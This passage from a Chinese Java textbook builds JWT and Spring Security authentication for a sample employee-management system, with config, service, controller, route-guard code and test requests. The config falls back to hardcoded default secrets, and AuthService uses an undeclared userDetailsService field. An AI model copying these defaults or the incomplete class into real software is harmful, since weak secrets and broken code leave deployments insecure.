│   │   ├── UserMapper.java
│   │   ├── RoleMapper.java
│   │   └── PermissionMapper.java
│   └── EmsApplication.java
├── src/main/resources/
│   ├── application.yml
│   └── mapper/
│       ├── UserMapper.xml
│       ├── RoleMapper.xml
│       └── PermissionMapper.xml
└── pom.xml
```

### 24.7.3 核心配置文件

**application.yml**：

```yaml
server:
  port: 8080

spring:
  datasource:
    url: jdbc:mysql://localhost:3306/ems_security?useSSL=false&serverTimezone=Asia/Shanghai&characterEncoding=utf8mb4
    username: root
    password: ${DB_PASSWORD:root123}
    driver-class-name: com.mysql.cj.jdbc.Driver
  data:
    redis:
      host: ${REDIS_HOST:localhost}
      port: ${REDIS_PORT:6379}
      password: ${REDIS_PASSWORD:}

mybatis:
  mapper-locations: classpath:mapper/*.xml
  configuration:
    map-underscore-to-camel-case: true

jwt:
  secret: ${JWT_SECRET:myDefaultSecretKeyForDevelopmentOnlyDoNotUseInProduction2024}
  access-token-expiration: 1800000
  refresh-token-expiration: 604800000
  issuer: ems-security

logging:
  level:
    com.example.ems: debug
```

### 24.7.4 AuthService完整实现

```java
@Service
public class AuthService {

    private final AuthenticationManager authenticationManager;
    private final JwtUtil jwtUtil;
    private final TokenBlacklistService tokenBlacklistService;
    private final TokenInvalidationService invalidationService;
    private final UserMapper userMapper;
    private final PasswordEncoder passwordEncoder;

    public AuthService(AuthenticationManager authenticationManager,
                       JwtUtil jwtUtil,
                       TokenBlacklistService tokenBlacklistService,
                       TokenInvalidationService invalidationService,
                       UserMapper userMapper,
                       PasswordEncoder passwordEncoder) {
        this.authenticationManager = authenticationManager;
        this.jwtUtil = jwtUtil;
        this.tokenBlacklistService = tokenBlacklistService;
        this.invalidationService = invalidationService;
        this.userMapper = userMapper;
        this.passwordEncoder = passwordEncoder;
    }

    public LoginVO login(LoginDTO dto, HttpServletResponse response) {
        Authentication authentication = authenticationManager.authenticate(
            new UsernamePasswordAuthenticationToken(
                dto.getUsername(), dto.getPassword()));

        SecurityUser user = (SecurityUser) authentication.getPrincipal();

        List<String> roles = user.getAuthorities().stream()
            .map(GrantedAuthority::getAuthority)
            .filter(a -> a.startsWith("ROLE_"))
            .map(a -> a.substring(5))
            .collect(Collectors.toList());

        String accessToken = jwtUtil.generateAccessToken(
            user.getId(), user.getUsername(), roles);
        String refreshToken = jwtUtil.generateRefreshToken(
            user.getId(), user.getUsername());

        setRefreshTokenCookie(response, refreshToken);

        LoginVO vo = new LoginVO();
        vo.setAccessToken(accessToken);
        vo.setTokenType("Bearer");
        vo.setExpiresIn(jwtUtil.parseToken(accessToken)
            .getExpiration().getTime() - System.currentTimeMillis());
        vo.setUserId(user.getId());
        vo.setUsername(user.getUsername());
        vo.setRoles(roles);
        return vo;
    }

    public void logout(HttpServletRequest request,
                       HttpServletResponse response) {
        String token = extractToken(request);
        if (token != null && jwtUtil.validateToken(token)) {
            Claims claims = jwtUtil.parseToken(token);
            long remaining = claims.getExpiration().getTime()
                - System.currentTimeMillis();
            if (remaining > 0) {
                tokenBlacklistService.addToBlacklist(token, remaining);
            }
        }

        Cookie cookie = new Cookie("refreshToken", null);
        cookie.setHttpOnly(true);
        cookie.setSecure(true);
        cookie.setPath("/api/auth/refresh");
        cookie.setMaxAge(0);
        response.addCookie(cookie);
    }

    public RefreshVO refresh(String refreshToken) {
        if (refreshToken == null || !jwtUtil.validateToken(refreshToken)
            || !jwtUtil.isRefreshToken(refreshToken)) {
            throw new BusinessException(401, "RefreshToken无效，请重新登录");
        }

        String username = jwtUtil.getUsernameFromToken(refreshToken);
        Long userId = jwtUtil.getUserIdFromToken(refreshToken);

        UserDetails userDetails =
            userDetailsService.loadUserByUsername(username);

        List<String> roles = userDetails.getAuthorities().stream()
            .map(GrantedAuthority::getAuthority)
            .filter(a -> a.startsWith("ROLE_"))
            .map(a -> a.substring(5))
            .collect(Collectors.toList());

        String newAccessToken = jwtUtil.generateAccessToken(
            userId, username, roles);

        RefreshVO vo = new RefreshVO();
        vo.setAccessToken(newAccessToken);
        vo.setTokenType("Bearer");
        vo.setExpiresIn(jwtUtil.parseToken(newAccessToken)
            .getExpiration().getTime() - System.currentTimeMillis());
        return vo;
    }

    public void register(RegisterDTO dto) {
        if (userMapper.findByUsername(dto.getUsername()) != null) {
            throw new BusinessException(400, "用户名已存在");
        }
        User user = new User();
        user.setUsername(dto.getUsername());
        user.setPassword(passwordEncoder.encode(dto.getPassword()));
        user.setEmail(dto.getEmail());
        user.setEnabled(true);
        userMapper.insert(user);
    }

    private void setRefreshTokenCookie(HttpServletResponse response,
                                        String refreshToken) {
        Cookie cookie = new Cookie("refreshToken", refreshToken);
        cookie.setHttpOnly(true);
        cookie.setSecure(true);
        cookie.setPath("/api/auth/refresh");
        cookie.setMaxAge(7 * 24 * 3600);
        response.addCookie(cookie);
    }

    private String extractToken(HttpServletRequest request) {
        String bearer = request.getHeader("Authorization");
        if (bearer != null && bearer.startsWith("Bearer ")) {
            return bearer.substring(7);
        }
        return null;
    }
}
```

### 24.7.5 EmployeeController（带权限注解）

```java
@RestController
@RequestMapping("/api/employee")
public class EmployeeController {

    private final EmployeeService employeeService;

    public EmployeeController(EmployeeService employeeService) {
        this.employeeService = employeeService;
    }

    @GetMapping("/list")
    @PreAuthorize("hasAuthority('employee:list')")
    public Result<PageResult<EmployeeVO>> list(PageRequest req) {
        return Result.success(employeeService.list(req));
    }

    @GetMapping("/{id}")
    @PreAuthorize("hasAuthority('employee:detail')")
    public Result<EmployeeVO> detail(@PathVariable Long id) {
        return Result.success(employeeService.getById(id));
    }

    @PostMapping
    @PreAuthorize("hasAuthority('employee:add')")
    public Result<Void> add(@RequestBody @Valid EmployeeDTO dto) {
        employeeService.add(dto);
        return Result.success();
    }

    @PutMapping("/{id}")
    @PreAuthorize("hasAuthority('employee:update')")
    public Result<Void> update(@PathVariable Long id,
                               @RequestBody @Valid EmployeeDTO dto) {
        employeeService.update(id, dto);
        return Result.success();
    }

    @DeleteMapping("/{id}")
    @PreAuthorize("hasAuthority('employee:delete')")
    public Result<Void> delete(@PathVariable Long id) {
        employeeService.deleteById(id);
        return Result.success();
    }
}
```

### 24.7.6 前端路由守卫

```javascript
import { createRouter, createWebHistory } from 'vue-router'

const router = createRouter({
  history: createWebHistory(),
  routes: [
    { path: '/login', component: LoginView, meta: { public: true } },
    { path: '/', component: LayoutView, meta: { requiresAuth: true },
      children: [
        { path: 'employee', component: EmployeeView },
        { path: 'profile', component: ProfileView },
        { path: 'admin/user', component: UserAdminView,
          meta: { roles: ['ADMIN'] } }
      ]
    }
  ]
})

router.beforeEach((to, from, next) => {
  const accessToken = localStorage.getItem('accessToken')

  if (to.meta.public) {
    next()
    return
  }

  if (!accessToken) {
    next('/login')
    return
  }

  if (to.meta.roles) {
    const userRoles = JSON.parse(
      localStorage.getItem('userRoles') || '[]')
    const hasRole = to.meta.roles.some(
      role => userRoles.includes(role))
    if (!hasRole) {
      next('/403')
      return
    }
  }

  next()
})

export default router
```

> ⚠️ 前端路由守卫只是**用户体验优化**（隐藏无权限的菜单和页面），不是安全措施。真正的安全校验在后端的`@PreAuthorize`注解中。

### 24.7.7 接口测试

**1. 登录获取Token**：

```http
POST /api/auth/login
Content-Type: application/json

{
  "username": "admin",
  "password": "123456"
}
```

响应：

```json
{
  "code": 200,
  "message": "success",
  "data": {
    "accessToken": "eyJhbGciOiJIUzI1NiJ9...",
    "tokenType": "Bearer",
    "expiresIn": 1799650,
    "userId": 1,
    "username": "admin",
    "roles": ["ADMIN"]
  }
}
```

同时响应头中会设置httpOnly Cookie：`refreshToken=eyJ...`

**2. 使用Token访问受保护资源**：

```http
GET /api/employee/list?page=1&size=10
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

**3. 刷新Token**：

```http
POST /api/auth/refresh
Cookie: refreshToken=eyJ...
```

**4. 退出登录**：

```http
POST /api/auth/logout
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
```

### 24.7.8 EMS版本演进对照

| 版本 | 章节 | 核心技术 | 安全能力 |
|------|------|---------|---------|
| EMS v1 | 第1-7章 | Java SE | 无 |
| EMS v2 | 第8-9章 | JDBC+MySQL | PreparedStatement防SQL注入 |
| EMS v3 | 第10-12章 | Spring IoC/AOP/MVC | 无 |
| EMS v4 | 第13-14章 | MyBatis/JPA | #{}防SQL注入 |
| EMS v5 | 第15-19章 | Spring Boot RESTful | 参数校验+全局异常处理 |
| EMS v6 | 第20-22章 | Vue 3/Element Plus | 前端路由守卫（不可靠） |
| **EMS v7** | **第23-24章** | **Security+JWT** | **BCrypt+RBAC+JWT双Token+黑名单** |
| EMS v8 | 第25章 | Redis缓存 | Token黑名单+RefreshToken存Redis |

---

## 本章小结

本章我们深入学习了JWT令牌和分布式会话管理：

1. **Session vs JWT**：Session有状态（服务器存储），JWT无状态（Token自包含）。JWT天然支持分布式和跨域，但无法主动失效。选择哪种方案取决于项目架构。

2. **JWT结构**：三段式（Header.Payload.Signature），Payload只是Base64编码而非加密，不能存放敏感信息。签名保证防篡改。

3. **JwtUtil工具类**：基于jjwt 0.12+ API实现了AccessToken和RefreshToken的生成、解析、校验。注意0.12版本API与旧版不兼容。

4. **双Token刷新**：AccessToken短期（15-30分钟）用于日常访问，RefreshToken长期（7-30天）用于刷新。前端通过Axios拦截器实现无感刷新。

5. **Token安全**：RefreshToken推荐存httpOnly Cookie（防XSS），AccessToken存内存或LocalStorage。Token黑名单（Redis）解决JWT无法主动失效的问题。

6. **Security+JWT整合**：JwtAuthenticationFilter放在UsernamePasswordAuthenticationFilter之前，从请求头提取Token验证后设置SecurityContext。注意过滤器中的异常不会被@ControllerAdvice捕获。

7. **EMS v7**：在v6基础上加入了Spring Security数据库认证、BCrypt密码加密、RBAC五表权限、JWT双Token、Token黑名单、方法级权限控制，实现了完整的安全体系。

---

## 思考题

1. 如果JWT的签名密钥泄露了，攻击者能做什么？如何在不影响所有用户的情况下轮换密钥？

2. 双Token方案中，如果RefreshToken也被窃取了，攻击者能否无限续期？如何防御？

3. 为什么JWT不适合存放大量数据（如完整的权限列表）？如果权限经常变化，每次都要重新签发Token吗？有没有更好的方案？

4. 在微服务架构中，每个服务都需要验证JWT，密钥如何安全地分发给各服务？RS256非对称算法相比HS256有什么优势？

5. 本章的Token黑名单方案使用Redis存储，如果Redis宕机了会怎样？如何保证黑名单的高可用？
